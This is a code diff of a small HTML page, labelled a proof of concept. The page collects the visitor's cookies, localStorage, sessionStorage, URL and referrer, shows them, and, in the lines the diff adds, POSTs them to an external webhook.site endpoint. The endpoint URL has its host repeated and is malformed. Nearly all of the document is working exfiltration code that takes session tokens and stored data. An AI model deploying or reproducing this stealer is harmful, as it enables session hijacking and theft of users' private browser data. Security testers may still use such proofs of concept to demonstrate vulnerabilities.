@@ -1,29 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>Test Page</title></head>
-<body>
-<h2 id="status">⏳ Collecting data...</h2>
-<pre id="output" style="background:#111;color:#0f0;padding:20px;font-size:12px;"></pre>
+<head><title>PoC Test</title></head>
+<body style="background:#111;color:#0f0;font-family:monospace;padding:20px;">
+
+<h2 id="status">⏳ Collecting...</h2>
+<pre id="output"></pre>
 
 <script>
   setTimeout(function() {
 
-    // Collect everything available
     var data = {
-      cookies:      document.cookie || "(empty)",
-      localStorage: JSON.stringify(localStorage),
+      cookies:        document.cookie || "(empty)",
+      localStorage:   JSON.stringify(localStorage),
       sessionStorage: JSON.stringify(sessionStorage),
-      userAgent:    navigator.userAgent,
-      url:          window.location.href,
-      referrer:     document.referrer,
-      timestamp:    new Date().toISOString()
+      userAgent:      navigator.userAgent,
+      url:            window.location.href,
+      referrer:       document.referrer || "(none)",
+      timestamp:      new Date().toISOString()
     };
 
-    // Show on screen
-    document.getElementById('status').innerHTML = '✅ Done';
+    // ✅ Show results on screen
+    document.getElementById('status').innerText = '✅ Done!';
     document.getElementById('output').innerText = JSON.stringify(data, null, 2);
+
+    // ✅ Send to your webhook - REPLACE the ID below
+    fetch('https://webhook.site/https://webhook.site/d185f8a4-925a-4573-8a27-e149a3569962', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
 
   }, 2000);
 </script>
+
 </body>
 </html>
